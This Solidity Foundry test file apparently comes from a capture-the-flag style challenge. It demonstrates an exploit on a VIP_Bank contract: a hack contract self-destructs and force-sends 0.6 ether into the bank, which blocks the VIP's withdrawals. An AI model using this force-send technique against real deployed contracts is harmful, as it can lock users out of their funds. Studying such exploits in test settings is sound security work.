pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {VIP_Bank, VIP_BankHack} from "../../src/vip-bank/vip-bank.sol";

// We need to get 0.6 Ether inside the VipBank contract.
// The only way to do that, without being a manager, is to send it to our contract, and self-distruct our contract into VipBank.
contract VipBankTest is Test {
    VIP_Bank public vipBank;
    VIP_BankHack public vipBankHack;

    address manager;
    address vip;
    address hacker;

    function setUp() public {
        vipBankHack = new VIP_BankHack();

        manager = makeAddr("manager");
        vip = makeAddr("vip");
        hacker = makeAddr("hacker");

        vm.deal(address(vip), 1 ether);
        vm.deal(address(hacker), 0.6 ether);
    }

    function testVipBank() public {
        // Create contract and add VIP
        vm.startPrank(manager, manager);

        vipBank = new VIP_Bank();
        assertEq(vipBank.manager(), manager);

        vipBank.addVIP(vip);
        assertTrue(vipBank.VIP(vip));

        vm.stopPrank();

        // Assert that VIP can currently withdraw
        vm.startPrank(vip, vip);

        vipBank.deposit{value: 0.05 ether}();
        vipBank.withdraw(0.05 ether);

        vm.stopPrank();

        // Hack contract
        vm.startPrank(hacker, hacker);

        vipBankHack = new VIP_BankHack{value: 0.6 ether}();
        assertEq(address(vipBankHack).balance, 0.6 ether);

        vipBankHack.callSelfDestruct(payable(address(vipBank)));
        assertEq(address(vipBank).balance, 0.6 ether);

        vm.stopPrank();

        // Assert that VIP can't withdraw anymore
        vm.startPrank(vip, vip);

        vipBank.deposit{value: 0.05 ether}();
        vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction");
        vipBank.withdraw(0.05 ether);

        vm.stopPrank();
    }
}
